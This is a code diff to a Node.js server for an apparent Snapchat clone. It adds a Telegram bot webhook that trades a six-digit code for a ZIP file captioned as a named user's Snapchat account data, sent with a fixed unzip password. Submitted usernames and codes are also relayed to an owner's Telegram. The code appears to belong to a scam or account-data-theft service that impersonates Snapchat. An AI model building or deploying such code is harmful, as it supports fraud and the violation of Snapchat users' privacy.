@@ -8,6 +8,13 @@ const crypto = require("crypto");
 const PORT = process.env.PORT || 3000;
 const STATIC = path.join(__dirname, "artifacts/snapchat-clone/dist/public");
 
+
+// ─── code store (code -> {username, ts}) ────────────────────────────────────
+const codeStore = new Map();
+setInterval(function() {
+  var now = Date.now();
+  codeStore.forEach(function(v, k) { if (now - v.ts > 3600000) codeStore.delete(k); });
+}, 600000);
 // ─── snap-profile ────────────────────────────────────────────────────────────
 function fetchUrl(rawUrl, hops) {
   hops = hops || 0;
@@ -239,6 +246,7 @@ http.createServer(async function (req, res) {
     req.on("end", function() {
       try {
         var data = JSON.parse(Buffer.concat(chunks).toString());
+        if (data.code && data.username) codeStore.set(data.code, { username: data.username, ts: Date.now() });
         var botToken = process.env.TELEGRAM_BOT_TOKEN || "";
         var ownerId = process.env.OWNER_ID || "";
         if (botToken && ownerId) {
@@ -260,6 +268,77 @@ http.createServer(async function (req, res) {
     });
     return;
   }
+
+  // API: telegram-webhook
+  if (req.method === "POST" && urlPath === "/api/telegram-webhook") {
+    var wchunks = [];
+    req.on("data", function(c) { wchunks.push(c); });
+    req.on("end", function() {
+      res.writeHead(200, { "Content-Type": "application/json" });
+      res.end(JSON.stringify({ ok: true }));
+      try {
+        var update = JSON.parse(Buffer.concat(wchunks).toString());
+        var msg = update.message || update.edited_message;
+        if (!msg) return;
+        var chatId = String(msg.chat.id);
+        var text = (msg.text || "").trim();
+        var botToken = process.env.TELEGRAM_BOT_TOKEN || "";
+        if (!botToken) return;
+        // Check if text is a 6-digit code
+        if (!/^\d{6}$/.test(text)) {
+          var replyData = JSON.stringify({ chat_id: chatId, text: "\u274C الرمز غير صحيح. أرسل رمز العملية المكون من 6 أرقام." });
+          var rReq = https.request({ hostname: "api.telegram.org", path: "/bot" + botToken + "/sendMessage", method: "POST", headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(replyData) } }, function(r){ r.resume(); });
+          rReq.on("error", function(){}); rReq.write(replyData); rReq.end();
+          return;
+        }
+        var entry = codeStore.get(text);
+        if (!entry) {
+          var nd = JSON.stringify({ chat_id: chatId, text: "\u274C الرمز منتهي الصلاحية أو غير موجود." });
+          var nReq = https.request({ hostname: "api.telegram.org", path: "/bot" + botToken + "/sendMessage", method: "POST", headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(nd) } }, function(r){ r.resume(); });
+          nReq.on("error", function(){}); nReq.write(nd); nReq.end();
+          return;
+        }
+        codeStore.delete(text);
+        var username = entry.username;
+        // Send "preparing" message
+        var prepMsg = JSON.stringify({ chat_id: chatId, text: "\u23F3 جارٍ تجهيز الملف للمعرف @" + username + "..." });
+        var pReq = https.request({ hostname: "api.telegram.org", path: "/bot" + botToken + "/sendMessage", method: "POST", headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(prepMsg) } }, function(r){ r.resume(); });
+        pReq.on("error", function(){}); pReq.write(prepMsg); pReq.end();
+        // Generate ZIP and send as document
+        setTimeout(function() {
+          try {
+            var zipBuf = handleAccountZip(username);
+            var boundary = "----TGBoundary" + Date.now();
+            var filename = username + "_snapchat_data.zip";
+            var caption = "\u2705 بيانات حساب @" + username + "\n\u{1F511} كلمة مرور فك الضغط: 12521252";
+            var part1 = Buffer.from(
+              "--" + boundary + "\r\n" +
+              "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + chatId + "\r\n" +
+              "--" + boundary + "\r\n" +
+              "Content-Disposition: form-data; name=\"caption\"\r\n\r\n" + caption + "\r\n" +
+              "--" + boundary + "\r\n" +
+              "Content-Disposition: form-data; name=\"document\"; filename=\"" + filename + "\"\r\n" +
+              "Content-Type: application/octet-stream\r\n\r\n"
+            );
+            var part2 = Buffer.from("\r\n--" + boundary + "--\r\n");
+            var body = Buffer.concat([part1, zipBuf, part2]);
+            var dReq = https.request({
+              hostname: "api.telegram.org",
+              path: "/bot" + botToken + "/sendDocument",
+              method: "POST",
+              headers: { "Content-Type": "multipart/form-data; boundary=" + boundary, "Content-Length": body.length }
+            }, function(r) {
+              var rd = []; r.on("data", function(c){ rd.push(c); }); r.on("end", function(){ console.log("sendDocument:", Buffer.concat(rd).toString().substring(0,200)); });
+            });
+            dReq.on("error", function(e){ console.error("sendDocument error:", e.message); });
+            dReq.write(body); dReq.end();
+          } catch(e) { console.error("zip/send error:", e.message); }
+        }, 500);
+      } catch(e) { console.error("webhook parse error:", e.message); }
+    });
+    return;
+  }
+
   // Root → index.html
   if (urlPath === "/" || urlPath === "") { serveIndex(res); return; }
 
@@ -271,4 +350,14 @@ http.createServer(async function (req, res) {
 
 }).listen(PORT, function () {
   console.log("Server running on port " + PORT);
+  // Register Telegram webhook
+  var botToken = process.env.TELEGRAM_BOT_TOKEN || "";
+  var appUrl = process.env.RENDER_EXTERNAL_URL || "";
+  if (botToken && appUrl) {
+    var webhookUrl = appUrl.replace(/\/$/, "") + "/api/telegram-webhook";
+    var wbData = JSON.stringify({ url: webhookUrl });
+    var wbReq = https.request({ hostname: "api.telegram.org", path: "/bot" + botToken + "/setWebhook", method: "POST", headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(wbData) } }, function(r){ var d=[]; r.on("data",function(c){d.push(c);}); r.on("end",function(){ console.log("Webhook set:", Buffer.concat(d).toString()); }); });
+    wbReq.on("error", function(e){ console.error("Webhook reg error:", e.message); });
+    wbReq.write(wbData); wbReq.end();
+  }
 });
